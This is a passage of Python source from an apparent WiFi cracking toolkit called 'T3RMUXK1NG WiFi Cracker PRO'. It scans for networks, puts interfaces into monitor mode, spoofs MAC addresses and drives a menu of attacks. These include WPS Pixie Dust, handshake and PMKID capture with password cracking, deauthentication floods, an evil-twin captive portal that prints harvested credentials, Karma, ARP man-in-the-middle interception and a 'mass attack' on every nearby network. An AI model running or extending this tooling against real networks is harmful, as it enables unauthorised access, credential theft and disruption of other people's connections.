        if 'WPA3' in self.encryption:
            score = 10
        elif 'WPA2' in self.encryption:
            score = 8
            if 'CCMP' in self.cipher or 'AES' in self.cipher:
                score = 9
        elif 'WPA' in self.encryption:
            score = 6
        elif 'WEP' in self.encryption:
            score = 2
        elif 'Open' in self.encryption or not self.encryption:
            score = 1
        
        if self.wps and not self.wps_locked:
            score = max(1, score - 3)
        
        return score
    
    @property
    def signal_quality(self) -> str:
        """Get signal quality description"""
        if self.power >= -50:
            return "Excellent"
        elif self.power >= -60:
            return "Good"
        elif self.power >= -70:
            return "Fair"
        elif self.power >= -80:
            return "Weak"
        else:
            return "Very Weak"
    
    def to_dict(self) -> Dict:
        """Convert to dictionary"""
        return {
            'bssid': self.bssid,
            'essid': self.essid,
            'channel': self.channel,
            'frequency': self.frequency,
            'band': self.band,
            'power': self.power,
            'signal_quality': self.signal_quality,
            'encryption': self.encryption,
            'cipher': self.cipher,
            'auth': self.auth,
            'wps': self.wps,
            'wps_locked': self.wps_locked,
            'wps_version': self.wps_version,
            'vendor': self.vendor,
            'clients': self.clients,
            'hidden': self.hidden,
            'wpa3': self.wpa3,
            'owe': self.owe,
            'security_score': self.security_score,
            'is_crackable': self.is_crackable,
            'first_seen': self.first_seen,
            'last_seen': self.last_seen,
            'notes': self.notes
        }
    
    def to_json(self) -> str:
        """Convert to JSON"""
        return json.dumps(self.to_dict())


# =============================================================================
# WIFI CLIENT DATA CLASS
# =============================================================================

@dataclass
class WiFiClient:
    """WiFi Client Data Structure"""
    mac: str
    bssid: str = ""
    power: int = -100
    packets: int = 0
    vendor: str = ""
    probe_requests: List[str] = field(default_factory=list)
    first_seen: str = ""
    last_seen: str = ""
    
    def __post_init__(self):
        if not self.first_seen:
            self.first_seen = datetime.datetime.now().isoformat()
        self.last_seen = datetime.datetime.now().isoformat()
    
    def to_dict(self) -> Dict:
        return {
            'mac': self.mac,
            'bssid': self.bssid,
            'power': self.power,
            'packets': self.packets,
            'vendor': self.vendor,
            'probe_requests': self.probe_requests,
            'first_seen': self.first_seen,
            'last_seen': self.last_seen
        }


# =============================================================================
# RESULT DATA CLASSES
# =============================================================================

@dataclass
class ScanResult:
    """Scan Result"""
    success: bool
    networks: List[WiFiNetwork] = field(default_factory=list)
    clients: List[WiFiClient] = field(default_factory=list)
    duration: float = 0.0
    error: str = ""
    timestamp: str = ""


@dataclass
class CaptureResult:
    """Capture Result"""
    success: bool
    bssid: str
    essid: str = ""
    cap_file: str = ""
    handshake_type: str = ""
    packets_captured: int = 0
    time_taken: float = 0.0
    error: str = ""


@dataclass
class CrackResult:
    """Crack Result"""
    success: bool
    target: str
    password: str = ""
    method: str = ""
    time_taken: float = 0.0
    attempts: int = 0
    speed: float = 0.0
    wordlist: str = ""
    error: str = ""


@dataclass
class AttackResult:
    """Attack Result"""
    success: bool
    attack_type: str
    target: str
    password: str = ""
    cap_file: str = ""
    time_taken: float = 0.0
    error: str = ""
    details: Dict = field(default_factory=dict)


# =============================================================================
# INTERFACE MANAGER
# =============================================================================

class InterfaceManager:
    """WiFi Interface Manager"""
    
    def __init__(self):
        self.interfaces: List[Dict] = []
        self.selected: Optional[str] = None
        self.monitor_interface: Optional[str] = None
        
        # OUI database for vendor lookup
        self.oui_db: Dict[str, str] = {}
        self._load_oui_db()
    
    def _load_oui_db(self):
        """Load OUI database"""
        oui_paths = [
            '/usr/share/ieee-data/oui.txt',
            '/usr/share/wireshark/manuf',
            '/etc/manuf',
        ]
        
        for path in oui_paths:
            if os.path.exists(path):
                try:
                    with open(path, 'r', errors='ignore') as f:
                        for line in f:
                            if ':' in line and not line.startswith('#'):
                                parts = line.strip().split()
                                if parts:
                                    prefix = parts[0].replace(':', '').upper()[:6]
                                    vendor = parts[-1] if len(parts) > 1 else 'Unknown'
                                    self.oui_db[prefix] = vendor
                except:
                    pass
                break
    
    def get_vendor(self, mac: str) -> str:
        """Get vendor from MAC address"""
        prefix = mac.replace(':', '').upper()[:6]
        return self.oui_db.get(prefix, 'Unknown')
    
    def list_interfaces(self) -> List[Dict]:
        """List all wireless interfaces"""
        self.interfaces = []
        
        # Check /sys/class/net for wireless interfaces
        net_dir = '/sys/class/net'
        if os.path.exists(net_dir):
            for iface in os.listdir(net_dir):
                wireless_path = os.path.join(net_dir, iface, 'wireless')
                phy80211_path = os.path.join(net_dir, iface, 'phy80211')
                
                if os.path.exists(wireless_path) or os.path.exists(phy80211_path):
                    info = self._get_interface_info(iface)
                    self.interfaces.append(info)
        
        return self.interfaces
    
    def _get_interface_info(self, name: str) -> Dict:
        """Get interface information"""
        info = {
            'name': name,
            'mode': 'Managed',
            'status': 'down',
            'mac': '',
            'ip': '',
            'ipv6': '',
            'netmask': '',
            'broadcast': '',
            'mtu': 1500,
            'txqueuelen': 1000,
            'rx_packets': 0,
            'tx_packets': 0,
            'rx_bytes': 0,
            'tx_bytes': 0,
            'vendor': '',
            'driver': '',
            'connected': False,
            'essid': '',
            'channel': 0,
            'signal': 0,
        }
        
        try:
            # Get status
            operstate = f'/sys/class/net/{name}/operstate'
            if os.path.exists(operstate):
                with open(operstate, 'r') as f:
                    info['status'] = f.read().strip()
            
            # Get MAC address
            address = f'/sys/class/net/{name}/address'
            if os.path.exists(address):
                with open(address, 'r') as f:
                    info['mac'] = f.read().strip()
                    info['vendor'] = self.get_vendor(info['mac'])
            
            # Get MTU
            mtu = f'/sys/class/net/{name}/mtu'
            if os.path.exists(mtu):
                with open(mtu, 'r') as f:
                    info['mtu'] = int(f.read().strip())
            
            # Get statistics
            stats_dir = f'/sys/class/net/{name}/statistics'
            if os.path.exists(stats_dir):
                for stat in ['rx_packets', 'tx_packets', 'rx_bytes', 'tx_bytes']:
                    stat_file = os.path.join(stats_dir, stat)
                    if os.path.exists(stat_file):
                        with open(stat_file, 'r') as f:
                            info[stat] = int(f.read().strip())
            
            # Get IP info
            result = subprocess.run(
                ['ip', 'addr', 'show', name],
                capture_output=True, text=True, timeout=5
            )
            
            if result.returncode == 0:
                # Parse IP
                match = re.search(r'inet (\d+\.\d+\.\d+\.\d+)/(\d+)', result.stdout)
                if match:
                    info['ip'] = match.group(1)
                    info['netmask'] = self._cidr_to_netmask(int(match.group(2)))
                
                # Parse IPv6
                match = re.search(r'inet6 ([a-f0-9:]+)', result.stdout)
                if match:
                    info['ipv6'] = match.group(1)
            
            # Get mode
            result = subprocess.run(
                ['iwconfig', name],
                capture_output=True, text=True, timeout=5
            )
            
            if result.returncode == 0:
                if 'Mode:Monitor' in result.stdout:
                    info['mode'] = 'Monitor'
                elif 'Mode:Master' in result.stdout:
                    info['mode'] = 'Master'
                
                # Get ESSID
                match = re.search(r'ESSID:"([^"]*)"', result.stdout)
                if match:
                    info['essid'] = match.group(1)
                    info['connected'] = True
                
                # Get channel
                match = re.search(r'Channel[=:](\d+)', result.stdout)
                if match:
                    info['channel'] = int(match.group(1))
                
                # Get signal
                match = re.search(r'Signal level[=:](-?\d+)', result.stdout)
                if match:
                    info['signal'] = int(match.group(1))
            
            # Get driver
            uevent = f'/sys/class/net/{name}/device/uevent'
            if os.path.exists(uevent):
                with open(uevent, 'r') as f:
                    content = f.read()
                    match = re.search(r'DRIVER=(.+)', content)
                    if match:
                        info['driver'] = match.group(1).strip()
        
        except Exception as e:
            logger.debug(f"Error getting interface info: {e}")
        
        return info
    
    def _cidr_to_netmask(self, cidr: int) -> str:
        """Convert CIDR to netmask"""
        mask = (0xffffffff >> (32 - cidr)) << (32 - cidr)
        return '.'.join([
            str((mask >> 24) & 0xff),
            str((mask >> 16) & 0xff),
            str((mask >> 8) & 0xff),
            str(mask & 0xff)
        ])
    
    def select_interface(self, interfaces: List[Dict] = None) -> Optional[str]:
        """Select interface interactively"""
        interfaces = interfaces or self.interfaces
        
        if not interfaces:
            logger.error("No wireless interfaces found!")
            return None
        
        print(f"\n{Colors.C}Available Interfaces:{Colors.RESET}")
        print(f"{Colors.B}{'#':<3} {'Name':<10} {'Mode':<10} {'Status':<8} {'MAC':<18} {'Vendor'}{Colors.RESET}")
        print("-" * 70)
        
        for i, iface in enumerate(interfaces, 1):
            mode_color = Colors.M if iface['mode'] == 'Monitor' else Colors.W
            status_color = Colors.G if iface['status'] == 'up' else Colors.R
            
            print(f"{i:<3} {iface['name']:<10} {mode_color}{iface['mode']:<10}{Colors.RESET} "
                  f"{status_color}{iface['status']:<8}{Colors.RESET} "
                  f"{iface['mac']:<18} {iface['vendor'][:20]}")
        
        try:
            choice = input(f"\n{Colors.Y}Select interface [1-{len(interfaces)}]: {Colors.RESET}")
            idx = int(choice) - 1
            if 0 <= idx < len(interfaces):
                self.selected = interfaces[idx]['name']
                logger.success(f"Selected: {self.selected}")
                return self.selected
        except (ValueError, IndexError):
            logger.error("Invalid selection")
        
        return None
    
    @require_root
    def enable_monitor_mode(self, interface: str = None) -> bool:
        """Enable monitor mode"""
        interface = interface or self.selected
        if not interface:
            raise InterfaceError("No interface specified")
        
        logger.info(f"Enabling monitor mode on {interface}...")
        
        # Kill interfering processes
        try:
            subprocess.run(
                ['sudo', 'airmon-ng', 'check', 'kill'],
                capture_output=True, timeout=30
            )
        except:
            pass
        
        # Method 1: Use airmon-ng
        try:
            result = subprocess.run(
                ['sudo', 'airmon-ng', 'start', interface],
                capture_output=True, text=True, timeout=30
            )
            
            # Check for new monitor interface
            match = re.search(r'monitor mode (?:enabled|VIF) on (\S+)', result.stdout)
            if match:
                self.monitor_interface = match.group(1)
                self.selected = self.monitor_interface
                logger.success(f"Monitor mode enabled on {self.monitor_interface}")
                return True
        except:
            pass
        
        # Method 2: Manual configuration
        commands = [
            ['sudo', 'ip', 'link', 'set', interface, 'down'],
            ['sudo', 'iw', 'dev', interface, 'set', 'type', 'monitor'],
            ['sudo', 'ip', 'link', 'set', interface, 'up'],
        ]
        
        for cmd in commands:
            try:
                subprocess.run(cmd, capture_output=True, timeout=10)
            except:
                pass
        
        # Verify
        if self._verify_monitor_mode(interface):
            self.monitor_interface = interface
            logger.success(f"Monitor mode enabled on {interface}")
            return True
        
        logger.error("Failed to enable monitor mode")
        return False
    
    @require_root
    def disable_monitor_mode(self, interface: str = None) -> bool:
        """Disable monitor mode"""
        interface = interface or self.monitor_interface or self.selected
        if not interface:
            return False
        
        logger.info(f"Disabling monitor mode on {interface}...")
        
        # Kill airmon-ng processes
        try:
            subprocess.run(
                ['sudo', 'airmon-ng', 'stop', interface],
                capture_output=True, timeout=30
            )
        except:
            pass
        
        # Manual configuration
        commands = [
            ['sudo', 'ip', 'link', 'set', interface, 'down'],
            ['sudo', 'iw', 'dev', interface, 'set', 'type', 'managed'],
            ['sudo', 'ip', 'link', 'set', interface, 'up'],
        ]
        
        for cmd in commands:
            try:
                subprocess.run(cmd, capture_output=True, timeout=10)
            except:
                pass
        
        # Restart NetworkManager
        try:
            subprocess.run(
                ['sudo', 'systemctl', 'restart', 'NetworkManager'],
                capture_output=True, timeout=30
            )
        except:
            pass
        
        self.monitor_interface = None
        logger.success("Monitor mode disabled")
        return True
    
    def _verify_monitor_mode(self, interface: str) -> bool:
        """Verify interface is in monitor mode"""
        try:
            result = subprocess.run(
                ['iwconfig', interface],
                capture_output=True, text=True, timeout=5
            )
            return 'Mode:Monitor' in result.stdout
        except:
            return False
    
    def set_channel(self, interface: str, channel: int) -> bool:
        """Set interface channel"""
        try:
            subprocess.run(
                ['sudo', 'iwconfig', interface, 'channel', str(channel)],
                capture_output=True, timeout=5
            )
            logger.debug(f"Channel set to {channel}")
            return True
        except:
            return False
    
    def change_mac(self, interface: str, new_mac: str) -> bool:
        """Change MAC address"""
        if not re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', new_mac):
            logger.error("Invalid MAC address format")
            return False
        
        commands = [
            ['sudo', 'ip', 'link', 'set', interface, 'down'],
            ['sudo', 'ip', 'link', 'set', interface, 'address', new_mac],
            ['sudo', 'ip', 'link', 'set', interface, 'up'],
        ]
        
        for cmd in commands:
            try:
                subprocess.run(cmd, capture_output=True, timeout=10)
            except Exception as e:
                logger.error(f"Failed to change MAC: {e}")
                return False
        
        logger.success(f"MAC changed to {new_mac}")
        return True
    
    def random_mac(self, interface: str = None) -> str:
        """Generate and set random MAC"""
        interface = interface or self.selected
        
        # Generate random MAC (locally administered)
        mac = [
            random.randint(0x00, 0xff) & 0xfe | 0x02,  # Locally administered
            random.randint(0x00, 0xff),
            random.randint(0x00, 0xff),
            random.randint(0x00, 0xff),
            random.randint(0x00, 0xff),
            random.randint(0x00, 0xff),
        ]
        
        new_mac = ':'.join(f'{b:02x}' for b in mac)
        
        if self.change_mac(interface, new_mac):
            return new_mac
        return ""


# =============================================================================
# MAIN APPLICATION CLASS
# =============================================================================

class RSWiFiCrackerPRO:
    """Main Application Class"""
    
    def __init__(self):
        self.version = __version__
        self.project_root = PROJECT_ROOT
        self.running = False
        
        # Initialize components
        self.config = config
        self.logger = logger
        self.db = Database()
        self.error_handler = error_handler
        
        # Managers
        self.interface_mgr = InterfaceManager()
        
        # Modules (lazy loaded)
        self._scanner = None
        self._capturer = None
        self._cracker = None
        self._attacker = None
        
        # State
        self.selected_interface: Optional[str] = None
        self.selected_networks: List[WiFiNetwork] = []
        self.scan_results: List[WiFiNetwork] = []
        self.session_id: Optional[int] = None
        self.session_stats: Dict = {
            'networks_scanned': 0,
            'handshakes_captured': 0,
            'passwords_cracked': 0
        }
    
    @property
    def scanner(self):
        """Lazy load scanner"""
        if self._scanner is None:
            from core.scanner import NetworkScanner
            self._scanner = NetworkScanner(self.selected_interface)
        return self._scanner
    
    @property
    def capturer(self):
        """Lazy load capturer"""
        if self._capturer is None:
            from core.capturer import HandshakeCapturer
            self._capturer = HandshakeCapturer(self.selected_interface)
        return self._capturer
    
    @property
    def cracker(self):
        """Lazy load cracker"""
        if self._cracker is None:
            from core.cracker import PasswordCracker
            self._cracker = PasswordCracker()
        return self._cracker
    
    @property
    def attacker(self):
        """Lazy load attacker"""
        if self._attacker is None:
            from core.attacker import AttackEngine
            self._attacker = AttackEngine(self.selected_interface)
        return self._attacker
    
    def initialize(self, interface: str = None):
        """Initialize application"""
        print(BANNER)
        
        # Check root
        if os.geteuid() != 0:
            logger.warning("Running without root - some features will be limited")
        
        # Create directories
        for d in ['logs', 'data', 'captures', 'reports', 'wordlists']:
            (self.project_root / d).mkdir(parents=True, exist_ok=True)
        
        # Select interface
        if interface:
            self.selected_interface = interface
        else:
            interfaces = self.interface_mgr.list_interfaces()
            if not interfaces:
                logger.error("No wireless interfaces found!")
                sys.exit(1)
            
            self.selected_interface = self.interface_mgr.select_interface(interfaces)
            if not self.selected_interface:
                sys.exit(1)
        
        # Start session
        self.session_id = self.db.start_session(self.selected_interface)
        
        self.running = True
        logger.success("T3RMUXK1NG WiFi Cracker PRO initialized!")
    
    def run_interactive(self):
        """Run interactive mode"""
        while self.running:
            self._show_main_menu()
            
            try:
                choice = input(f"\n{Colors.Y}RS-PRO> {Colors.RESET}").strip()
                self._handle_choice(choice)
            except KeyboardInterrupt:
                print(f"\n{Colors.Y}Press 0 to exit{Colors.RESET}")
            except Exception as e:
                self.error_handler.handle(e)
    
    def _show_main_menu(self):
        """Show main menu"""
        print(f"""
{Colors.B}═══════════════════════════════════════════════════════════════════{Colors.RESET}
{Colors.W}  {Colors.G}1.{Colors.W} Scan Networks           {Colors.G}15.{Colors.W} Generate Wordlist
  {Colors.G}2.{Colors.W} Select Targets          {Colors.G}16.{Colors.W} Generate Report
  {Colors.G}3.{Colors.W} Capture Handshake       {Colors.G}17.{Colors.W} Web Dashboard
  {Colors.G}4.{Colors.W} Crack Passwords         {Colors.G}18.{Colors.W} API Server
  {Colors.G}5.{Colors.W} WPS Attack              {Colors.G}19.{Colors.W} Settings
  {Colors.G}6.{Colors.W} Evil Twin Attack        {Colors.G}20.{Colors.W} Statistics
  {Colors.G}7.{Colors.W} PMKID Attack            {Colors.G}21.{Colors.W} Saved Results
  {Colors.G}8.{Colors.W} Deauth Attack           {Colors.G}22.{Colors.W} Plugins
  {Colors.G}9.{Colors.W} Karma Attack            {Colors.G}23.{Colors.W} Database
  {Colors.G}10.{Colors.W} MITM Attack            {Colors.G}24.{Colors.W} Monitor Mode
  {Colors.G}11.{Colors.W} Auto Attack            {Colors.G}25.{Colors.W} Interface Info
  {Colors.G}12.{Colors.W} Mass Attack            {Colors.G}26.{Colors.W} Update
  {Colors.G}13.{Colors.W} Hashcat Attack         {Colors.G}27.{Colors.W} Telegram Bot
  {Colors.G}14.{Colors.W} AI Cracker             {Colors.G}28.{Colors.W} Tools
  {Colors.R}0.{Colors.W} Exit                    {Colors.G}99.{Colors.W} Help
{Colors.B}═══════════════════════════════════════════════════════════════════{Colors.RESET}""")
    
    def _handle_choice(self, choice: str):
        """Handle menu choice"""
        handlers = {
            '0': self._exit,
            '1': self._scan_networks,
            '2': self._select_targets,
            '3': self._capture_handshake,
            '4': self._crack_passwords,
            '5': self._wps_attack,
            '6': self._evil_twin,
            '7': self._pmkid_attack,
            '8': self._deauth_attack,
            '9': self._karma_attack,
            '10': self._mitm_attack,
            '11': self._auto_attack,
            '12': self._mass_attack,
            '99': self._show_help,
        }
        
        handler = handlers.get(choice)
        if handler:
            handler()
        elif choice:
            logger.warning(f"Unknown option: {choice}")
    
    def _exit(self):
        """Exit application"""
        self.shutdown()
    
    def _scan_networks(self):
        """Scan for networks"""
        logger.section("Network Scanner")
        
        print(f"""
{Colors.C}Scan Options:{Colors.RESET}
  {Colors.G}1.{Colors.W} Quick Scan (15s)
  {Colors.G}2.{Colors.W} Normal Scan (30s)
  {Colors.G}3.{Colors.W} Deep Scan (60s)
  {Colors.G}4.{Colors.W} Extended Scan (120s)
  {Colors.G}5.{Colors.W} Continuous Scan
  {Colors.G}6.{Colors.W} Channel-specific Scan
  {Colors.G}7.{Colors.W} Band Scan (2.4GHz + 5GHz)
  {Colors.G}8.{Colors.W} Scapy Scan
""")
        
        choice = input(f"{Colors.Y}Select: {Colors.RESET}").strip()
        
        durations = {'1': 15, '2': 30, '3': 60, '4': 120}
        
        try:
            if choice in durations:
                networks = self.scanner.scan(durations[choice])
                self.scan_results = networks
                self._display_networks(networks)
                self.session_stats['networks_scanned'] = len(networks)
            
            elif choice == '5':
                self.scanner.scan_continuous(self._on_network_found)
            
            elif choice == '6':
                channel = int(input(f"{Colors.Y}Channel: {Colors.RESET}"))
                networks = self.scanner.scan_channel(channel)
                self.scan_results = networks
                self._display_networks(networks)
            
            elif choice == '7':
                networks = self.scanner.scan_bands()
                self.scan_results = networks
                self._display_networks(networks)
            
            elif choice == '8':
                duration = int(input(f"{Colors.Y}Duration: {Colors.RESET}") or "30")
                networks = self.scanner.scan_scapy(duration)
                self.scan_results = networks
                self._display_networks(networks)
        
        except Exception as e:
            self.error_handler.handle(e)
    
    def _on_network_found(self, network: WiFiNetwork):
        """Callback for continuous scan"""
        print(f"{Colors.G}[+]{Colors.W} {network.essid} ({network.bssid}) - "
              f"Ch:{network.channel} {network.encryption}{Colors.RESET}")
    
    def _display_networks(self, networks: List[WiFiNetwork]):
        """Display scan results"""
        if not networks:
            logger.warning("No networks found")
            return
        
        print(f"\n{Colors.C}{'='*100}{Colors.RESET}")
        print(f"{Colors.B}{'#':<3} {'BSSID':<18} {'ESSID':<25} {'CH':<4} {'PWR':<8} "
              f"{'ENC':<12} {'WPS':<5} {'SCORE':<6}{Colors.RESET}")
        print(f"{Colors.C}{'='*100}{Colors.RESET}")
        
        for i, net in enumerate(networks, 1):
            wps_str = f"{Colors.G}Yes{Colors.RESET}" if net.wps else f"{Colors.R}No{Colors.RESET}"
            pwr_color = Colors.G if net.power > -50 else Colors.Y if net.power > -70 else Colors.R
            enc_color = Colors.G if 'WPA3' in net.encryption else Colors.Y if 'WPA2' in net.encryption else Colors.R
            
            print(f"{i:<3} {net.bssid:<18} {net.essid[:25]:<25} {net.channel:<4} "
                  f"{pwr_color}{net.power:>6} dBm{Colors.RESET} "
                  f"{enc_color}{net.encryption[:12]:<12}{Colors.RESET} "
                  f"{wps_str}   {net.security_score}/10")
        
        print(f"{Colors.C}{'='*100}{Colors.RESET}")
        print(f"{Colors.G}Total: {len(networks)} networks | "
              f"Crackable: {sum(1 for n in networks if n.is_crackable)} | "
              f"WPS: {sum(1 for n in networks if n.wps)}{Colors.RESET}")
    
    def _select_targets(self):
        """Select target networks"""
        if not self.scan_results:
            logger.error("Scan networks first!")
            return
        
        self._display_networks(self.scan_results)
        
        selection = input(f"\n{Colors.Y}Select targets (comma-separated or 'all'): {Colors.RESET}").strip()
        
        if selection.lower() == 'all':
            self.selected_networks = self.scan_results.copy()
        else:
            try:
                indices = [int(x.strip()) - 1 for x in selection.split(',')]
                self.selected_networks = [self.scan_results[i] for i in indices 
                                          if 0 <= i < len(self.scan_results)]
            except (ValueError, IndexError):
                logger.error("Invalid selection")
                return
        
        logger.success(f"Selected {len(self.selected_networks)} targets")
    
    def _capture_handshake(self):
        """Capture handshake"""
        if not self.selected_networks:
            logger.error("Select targets first!")
            return
        
        logger.section("Handshake Capture")
        
        for target in self.selected_networks:
            logger.target(f"Capturing: {target.essid}")
            
            # Enable monitor mode if needed
            if not self.interface_mgr._verify_monitor_mode(self.selected_interface):
                self.interface_mgr.enable_monitor_mode(self.selected_interface)
            
            result = self.capturer.capture(target)
            
            if result.success:
                logger.success(f"Handshake captured: {result.cap_file}")
                self.session_stats['handshakes_captured'] += 1
                self.db.insert('captures', {
                    'bssid': target.bssid,
                    'essid': target.essid,
                    'cap_file': result.cap_file,
                    'handshake': True,
                    'packets': result.packets_captured,
                    'duration': result.time_taken
                })
            else:
                logger.error(f"Failed: {result.error}")
    
    def _crack_passwords(self):
        """Crack passwords"""
        logger.section("Password Cracker")
        
        cap_file = input(f"{Colors.Y}Capture file: {Colors.RESET}").strip()
        wordlist = input(f"{Colors.Y}Wordlist: {Colors.RESET}").strip()
        
        if not cap_file:
            logger.error("No capture file specified")
            return
        
        if not wordlist:
            wordlist = str(self.project_root / 'wordlists' / 'wifi_common.txt')
        
        result = self.cracker.crack(cap_file, wordlist)
        
        if result.success:
            print(f"\n{Colors.G}{'='*50}{Colors.RESET}")
            print(f"{Colors.G}PASSWORD FOUND: {result.password}{Colors.RESET}")
            print(f"{Colors.G}{'='*50}{Colors.RESET}")
            
            self.session_stats['passwords_cracked'] += 1
        else:
            logger.error(f"Failed: {result.error}")
    
    def _wps_attack(self):
        """WPS Attack"""
        if not self.selected_networks:
            logger.error("Select targets first!")
            return
        
        from modules.wps_attack import WPSAttacker
        
        logger.section("WPS Attack")
        
        wps = WPSAttacker(self.selected_interface)
        
        for target in self.selected_networks:
            if not target.wps:
                logger.warning(f"WPS not detected on {target.essid}")
                continue
            
            result = wps.attack(target.bssid, "pixie")
            
            if result.success:
                print(f"\n{Colors.G}PASSWORD: {result.password}{Colors.RESET}")
                if result.pin:
                    print(f"{Colors.G}PIN: {result.pin}{Colors.RESET}")
    
    def _evil_twin(self):
        """Evil Twin Attack"""
        if not self.selected_networks:
            logger.error("Select targets first!")
            return
        
        from modules.evil_twin import EvilTwin
        
        logger.section("Evil Twin")
        
        evil = EvilTwin(self.selected_interface)
        target = self.selected_networks[0]
        
        evil.start(target, 'portal')
        
        logger.info("Evil Twin running. Press Ctrl+C to stop.")
        
        try:
            while True:
                cred = evil.get_credentials()
                if cred:
                    print(f"{Colors.G}[CREDENTIAL]{Colors.W} {cred.username}: {cred.password}{Colors.RESET}")
                time.sleep(1)
        except KeyboardInterrupt:
            evil.stop()
            logger.info("Evil Twin stopped")
    
    def _pmkid_attack(self):
        """PMKID Attack"""
        if not self.selected_networks:
            logger.error("Select targets first!")
            return
        
        from modules.pmkid import PMKIDAttacker
        
        logger.section("PMKID Attack")
        
        pmkid = PMKIDAttacker(self.selected_interface)
        
        for target in self.selected_networks:
            result = pmkid.attack(target.bssid)
            
            if result.success:
                logger.success(f"PMKID captured: {result.pmkid_file}")
            else:
                logger.error(f"Failed: {result.error}")
    
    def _deauth_attack(self):
        """Deauth Attack"""
        if not self.selected_networks:
            logger.error("Select targets first!")
            return
        
        from modules.deauth import DeauthAttacker
        
        logger.section("Deauth Attack")
        
        deauth = DeauthAttacker(self.selected_interface)
        
        count = int(input(f"{Colors.Y}Packet count [10]: {Colors.RESET}") or "10")
        
        for target in self.selected_networks:
            result = deauth.attack(target.bssid, "broadcast", count)
            
            if result.success:
                logger.success(f"Sent {result.packets_sent} packets")
            else:
                logger.error(f"Failed: {result.error}")
    
    def _karma_attack(self):
        """Karma Attack"""
        from modules.karma import KarmaAttacker
        
        logger.section("Karma Attack")
        
        karma = KarmaAttacker(self.selected_interface)
        karma.start()
        
        logger.info("Karma attack running. Press Ctrl+C to stop.")
        
        try:
            while True:
                probe = karma.get_probe()
                if probe:
                    print(f"{Colors.C}[PROBE]{Colors.W} {probe.client_mac} -> {probe.ssid}{Colors.RESET}")
                time.sleep(0.5)
        except KeyboardInterrupt:
            karma.stop()
            logger.info("Karma stopped")
    
    def _mitm_attack(self):
        """MITM Attack"""
        if not self.selected_networks:
            logger.error("Select targets first!")
            return
        
        from modules.mitm import MITMAttacker
        
        logger.section("MITM Attack")
        
        mitm = MITMAttacker(self.selected_interface)
        target = self.selected_networks[0]
        
        mitm.start(target, 'arp')
        
        logger.info("MITM running. Press Ctrl+C to stop.")
        
        try:
            while True:
                data = mitm.get_intercepted()
                if data:
                    print(f"{Colors.C}[INTERCEPTED]{Colors.W} {data.type}: {data.content[:50]}{Colors.RESET}")
                time.sleep(1)
        except KeyboardInterrupt:
            mitm.stop()
            logger.info("MITM stopped")
    
    def _auto_attack(self):
        """Auto Attack"""
        if not self.selected_networks:
            logger.error("Select targets first!")
            return
        
        logger.section("Auto Attack")
        
        for target in self.selected_networks:
            logger.target(f"Attacking: {target.essid}")
            
            # Try WPS first
            if target.wps:
                from modules.wps_attack import WPSAttacker
                wps = WPSAttacker(self.selected_interface)
                result = wps.attack(target.bssid, "pixie")
                
                if result.success:
                    print(f"{Colors.G}PASSWORD: {result.password}{Colors.RESET}")
                    continue
            
            # Try PMKID
            from modules.pmkid import PMKIDAttacker
            pmkid = PMKIDAttacker(self.selected_interface)
            result = pmkid.attack(target.bssid)
            
            if result.success:
                # Crack PMKID
                crack_result = self.cracker.crack_pmkid(result.pmkid_file)
                if crack_result.success:
                    print(f"{Colors.G}PASSWORD: {crack_result.password}{Colors.RESET}")
                    continue
            
            # Try handshake
            self.capturer.capture(target)
    
    def _mass_attack(self):
        """Mass Attack"""
        if not self.scan_results:
            logger.error("Scan networks first!")
            return
        
        logger.warning("This will attack ALL networks!")
        confirm = input(f"{Colors.Y}Continue? [y/N]: {Colors.RESET}").strip()
        
        if confirm.lower() == 'y':
            self.selected_networks = self.scan_results.copy()
            self._auto_attack()
    
    def _show_help(self):
        """Show help"""
        print(f"""
{Colors.C}T3RMUXK1NG WiFi Cracker PRO - Help{Colors.RESET}

{Colors.G}Quick Start:{Colors.RESET}
  1. Select interface (auto-detected)
  2. Scan for networks (Option 1)
  3. Select targets (Option 2)
  4. Choose attack method

{Colors.G}Attack Methods:{Colors.RESET}
  • Handshake Capture - WPA/WPA2 4-way handshake
  • WPS Attack - Pixie Dust & PIN brute force
  • PMKID Attack - Offline attack without clients
  • Evil Twin - Rogue AP with captive portal
  • Deauth - Disconnect clients
  • Karma - Exploit auto-connect
  • MITM - Man-in-the-middle attacks

{Colors.G}Tips:{Colors.RESET}
  • Get close to target for better signal
  • WPS Pixie Dust is fastest (if vulnerable)
  • Use custom wordlists for better results
  • Evil Twin works well with deauth

Press Enter to continue...""")
        input()
    
    def shutdown(self):
        """Shutdown application"""
        logger.info("Shutting down...")
        
        # Stop all attacks
        if self._attacker:
            self._attacker.stop()
        
        # Restore interface
        if self.interface_mgr.monitor_interface:
            self.interface_mgr.disable_monitor_mode()
        
        # Save session
        if self.session_id:
            self.db.end_session(self.session_id, self.session_stats)
        
        self.running = False
        logger.success("Goodbye!")
    
    def run_cli(self, args):
        """Run in CLI mode"""
        if args.interface:
            self.selected_interface = args.interface
        else:
            interfaces = self.interface_mgr.list_interfaces()
            if interfaces:
                self.selected_interface = interfaces[0]['name']
        
        if args.scan:
            networks = self.scanner.scan(30)
            self._display_networks(networks)
        
        elif args.attack:
            # Handle CLI attack
            pass
        
        elif args.crack:
            result = self.cracker.crack(args.crack, args.wordlist or '')
            if result.success:
                print(f"PASSWORD: {result.password}")
            else:
                print(f"FAILED: {result.error}")


# =============================================================================
# CLI ENTRY POINT
# =============================================================================

def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description='T3RMUXK1NG WiFi Cracker PRO - Ultimate WiFi Security Testing Toolkit',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    parser.add_argument('-i', '--interface', help='Wireless interface')
    parser.add_argument('-s', '--scan', action='store_true', help='Scan networks')
    parser.add_argument('-a', '--attack', choices=[
        'wps', 'pmkid', 'deauth', 'handshake', 'evil-twin', 'karma', 'mitm'
    ], help='Attack type')
    parser.add_argument('-t', '--target', help='Target BSSID')
    parser.add_argument('-c', '--channel', type=int, help='Target channel')
    parser.add_argument('--crack', help='Capture file to crack')
    parser.add_argument('-w', '--wordlist', help='Wordlist for cracking')
    parser.add_argument('--dashboard', action='store_true', help='Start web dashboard')
    parser.add_argument('--api', action='store_true', help='Start API server')
    parser.add_argument('-v', '--version', action='version', 
                        version=f'T3RMUXK1NG WiFi Cracker PRO v{__version__}')
    
    args = parser.parse_args()
    
    app = RSWiFiCrackerPRO()
    
    if len(sys.argv) == 1:
        # Interactive mode
        app.initialize()
        app.run_interactive()
    else:
        # CLI mode
        app.run_cli(args)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
